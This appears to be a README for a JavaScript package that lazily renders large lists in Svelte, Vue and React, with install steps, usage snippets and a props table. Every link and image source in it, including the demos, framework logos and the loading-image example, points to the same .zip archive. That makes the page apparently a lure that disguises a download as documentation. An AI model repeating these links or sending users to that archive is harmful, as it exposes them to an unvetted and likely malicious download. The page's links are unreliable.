# Lazy Load List

### Lazy Load List is a lightweight web package that loads items in lazy way to achieve high performance and better UX in large lists.

Rendering large lists makes the first load slow especially if items contain images, so this package split the list to small lists then it renders them one by one when scrolling to the end of the list..

you can notice the deference here:

![loading performance deference](https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip)
## Features

 - Fast Loading 🚀
 - Lightweight package
 - Better user experience 
 - Supports most loved JS frameworks
 - Supports SSR & SSG

## Demo

-  [Simple example in Svelte js](https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip)
-  [Simple example in Vue js](https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip)
-  [Simple example in React js](https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip)

you can find the source code of examples in [examples](https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip) folder

## Lazy Load List 1.2 is here 🎉

### what's new?

 - support React js
 - auto loading items when container can contain more
 - better performance
 - explain using custom loading element

## Supported Frameworks
<pre>
| <img width="14" src="https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip" alt="svelte logo"/> | Svete js     | ✅
| <img width="14" src="https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip" alt="vue logo"/> | Vue js (2,3) | ✅
| <img width="14" src="https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip" alt="react logo"/> | React js     | ✅
</pre>

## Installation

install the package using npm or yarn:

install using npm

`  $ npm i lazy-load-list `

or using yarn

`  $ yarn add lazy-load-list `

## Usage

> ⚠  you must wrap the list by div and specify the height and width in the wrapper div.

- <img width="14" src="https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip" alt="svelte logo"/> svelte js:

> 
	import LazyList from 'lazy-load-list/svelte'

	<div  class="container">
		<LazyList
			data={colors}
			itemsPerRender={15}
			containerClasses="list"
			defaultLoadingColor="#222"
			let:item={item}
		>
			<h1>{ item }<h1>
		</LazyList>
	</div>

- <img width="14" src="https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip" alt="vue logo"/> vue js:

> 
	<div class="container">
		<LazyList
			:data="items"
			:itemsPerRender="15"
			containerClasses="list"
			defaultLoadingColor="#222"
		>
			<template v-slot="{item}">
			    <h1>{{ item }}<h1>
			</template>
		</LazyList>
	</div>

	// script
	import LazyList from 'lazy-load-list/vue'
	..
	components: { LazyList } // don't forget to define it in the components
	

- <img width="14" src="https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip" alt="react logo"/> react js:

> 
	import  LazyList  from  'lazy-load-list/react'
	
	const renderItem = ({item, index}) => (
		<h1 key={index}>{ item }</h1>
	)
	
	<div className="container">
		<LazyList
			data={colors}
			itemsPerRender={15}
			containerClasses="list"
			defaultLoadingColor="#222"
			renderItem={renderItem}
		/>
	</div>
	
## Props

<table>
	<tr>
		<td>prop</td>
		<td>supported framework</td>
		<td>description</td>
		<td>required</td>
		<td>type</td>
		<td>default value</td>
	</tr>
	<tr>
		<td>data</td>
		<td>all</td>
		<td>the item array</td>
		<td>yes</td>
		<td>array</td>
		<td>[]</td>
	</tr>
	<tr>
		<td>itemsPerRender</td>
		<td>all</td>
		<td>items to be rendered per load</td>
		<td>yes</td>
		<td>number</td>
		<td>3</td>
	</tr>
	<tr>
		<td>containerClasses</td>
		<td>all</td>
		<td>list container classes for CSS</td>
		<td>no</td>
		<td>string</td>
		<td>''</td>
	</tr>
	<tr>
		<td>defaultLoading</td>
		<td>all</td>
		<td>to show the default loading or not</td>
		<td>no</td>
		<td>bool</td>
		<td>true</td>
	</tr>
	<tr>
		<td>defaultLoadingColor</td>
		<td>all</td>
		<td>color of the default loading </td>
		<td>no</td>
		<td>string</td>
		<td>'#18191A'</td>
	</tr>
	<tr>
		<td>renderItem</td>
		<td>React js</td>
		<td>element to be render for each item</td>
		<td>yes</td>
		<td>React component</td>
		<td>() => null</td>
	</tr>
	<tr>
		<td>loadingComponent</td>
		<td>React js</td>
		<td>custom loading component</td>
		<td>no</td>
		<td>React component</td>
		<td>() => null</td>
	</tr>
</table>


## Using custom loading element

you can specify the loading element color using (defaultLoadingColor) prop..
but if you don't like the default loading element, you can use custom one:


- in <img width="14" src="https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip" alt="svelte logo"/> svelte js &  <img width="14" src="https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip" alt="vue logo"/> vue js (just use slot name "loading like this):

> 
	<img slot="loading" src="https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip" width="16" alt="loading"/>

- <img width="14" src="https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip" alt="react logo"/> react js (use loadingComponent props to pass the element):

> 
		..
			loadingComponent={loadingElementHere}
		/>
	
	